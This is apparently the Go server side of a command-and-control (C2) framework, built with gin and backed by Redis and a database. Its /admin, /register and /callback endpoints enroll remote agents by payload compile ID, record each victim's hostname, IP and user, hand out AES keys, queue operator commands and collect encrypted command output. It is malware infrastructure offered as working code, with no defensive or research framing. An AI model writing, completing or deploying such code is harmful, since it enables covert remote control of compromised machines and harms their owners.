package main

import (
	"encoding/base64"
	"log"
	"net/http"

	"github.com/gin-gonic/gin"
)

func main() {
	type Admin struct {
		UUID string `json:"uuid" binding:"required"`
		Cmd  string `json:"command" binding:"required"`
	}
	type RegisterRequest struct {
		UUID     string `json:"uuid" binding:"required"`
		User     string `json:"user"`
		CID      string `json:"compile_id" binding:"required"`
		Profile  string `json:"profile"`
		Hostname string `json:"hostname"`
		IP       string `json:"ip"`
	}
	type CommandRequest struct {
		UUID   string `json:"uuid" binding:"required"`
		Data   string `json:"data"`
		Action string `json:"action"`
	}

	route := gin.Default()

	// Routes
	route.POST("/admin", func(c *gin.Context) {
		var data Admin
		if err := c.BindJSON(&data); err == nil {
			R.RPush(Ctx, data.UUID, data.Cmd)
			if R.LLen(Ctx, data.UUID).Val() > 100 {
				R.LPop(Ctx, data.UUID)
			}
			c.String(http.StatusOK, "Command Sent!")
			return
		} else {
			c.JSON(http.StatusBadRequest, gin.H{"Error": "Bad Request"})
			return
		}
	})

	route.POST("/register", func(c *gin.Context) {
		var data RegisterRequest
		if err := c.BindJSON(&data); err == nil {

			// Verify connections
			if DB == nil {
				log.Println("DB is nil")
				c.JSON(http.StatusInternalServerError, gin.H{"Error": "Database not connected"})
				return
			}
			if R == nil {
				log.Println("Redis client is nil")
				c.JSON(http.StatusInternalServerError, gin.H{"Error": "Redis not connected"})
				return
			}

			rows, err := DB.Query("SELECT compile_id FROM payloads WHERE compile_id = ?", data.CID)
			if err != nil {
				log.Println(err)
				c.JSON(http.StatusInternalServerError, gin.H{"Error": "Database query failed"})
				return
			}
			defer rows.Close()
			result := get_data(rows)

			if len(result) == 0 {
				c.JSON(http.StatusOK, gin.H{
					"data":  "",
					"param": "",
				})
				return
			}

			exists := R.Exists(Ctx, data.UUID).Val()
			if exists == 0 {
				result = register_agent(data.UUID, data.Profile, data.IP, data.Hostname, data.User, data.CID)
				if len(result) == 0 || len(result[0]) < 2 {
					c.JSON(http.StatusInternalServerError, gin.H{"Error": "Payload not found"})
					return
				}
				key := base64.StdEncoding.EncodeToString([]byte(result[0][0]))
				iv := base64.StdEncoding.EncodeToString([]byte(result[0][1]))
				c.JSON(200, gin.H{
					"data":  string(key),
					"param": string(iv),
				})
			}

		} else {
			c.JSON(http.StatusBadRequest, gin.H{"Error": "Bad Request"})
		}
	})

	route.POST("/callback", func(c *gin.Context) {
		var data CommandRequest
		var err error
		if err = c.BindJSON(&data); err != nil {
			c.JSON(400, gin.H{"error": err.Error()})
			return
		}
		if data.Action == "Request" {
			keys := get_keys(data.UUID)
			cache, err := R.LIndex(Ctx, data.UUID, -1).Result()
			if err != nil {
				log.Println(err)
				return
			}
			if cache == "SEEN" || cache == "AGENT REGISTERED" {
				update_seen(data.UUID)
				if keys != nil {
					enc_command, err := aes_encrypt([]byte(""), keys[0][0], keys[0][1])
					if err != nil {
						log.Println(err)
						return
					}
					enc_param, err := aes_encrypt([]byte(""), keys[0][0], keys[0][1])
					if err != nil {
						log.Println(err)
						return
					}
					c.JSON(200, gin.H{
						"data":  enc_command,
						"param": enc_param,
					})
					return
				} else {
					c.JSON(200, gin.H{
						"data":  "",
						"param": "",
					})
					return
				}
			} else {
				cmd := split(cache, 1)
				var param string
				if len(cmd) > 1 {
					param = cmd[1]
				} else {
					param = ""
				}
				update_seen(data.UUID)
				R.RPush(Ctx, data.UUID, "SEEN")
				small_check(data.UUID)

				if keys != nil {
					enc_command, err := aes_encrypt([]byte(cmd[0]), keys[0][0], keys[0][1])
					if err != nil {
						log.Println(err)
						return
					}
					enc_param, err := aes_encrypt([]byte(param), keys[0][0], keys[0][1])
					if err != nil {
						log.Println(err)
						return
					}
					c.JSON(200, gin.H{
						"data":  enc_command,
						"param": enc_param,
					})
					return
				} else {
					b64cmd := base64.StdEncoding.EncodeToString([]byte(cmd[0]))
					b64param := base64.StdEncoding.EncodeToString([]byte(param))
					c.JSON(200, gin.H{
						"data":  string(b64cmd),
						"param": string(b64param),
					})
					return
				}
			}
		} else if data.Action == "Reply" {
			// prev POST
			aes_keys := get_keys(data.UUID)
			var output string
			if aes_keys == nil {
				bytedata, err := base64.StdEncoding.DecodeString(data.Data)
				if err != nil {
					log.Println(err)
					return
				}
				output = string(bytedata)
			} else {
				output, err = aes_decrypt(data.Data, aes_keys[0][0], aes_keys[0][1])
				if err != nil {
					log.Println(err)
					return
				}
			}
			key := data.UUID + "-output"
			if data.UUID != "" && output != "" {
				R.Publish(Ctx, key, output)
			} else {
				R.Publish(Ctx, key, "Data failed to be decrypted (AES issue?)\n")
			}
			c.String(http.StatusOK, "Success")
			return
		}
	})
	route.Run(":8000")
}
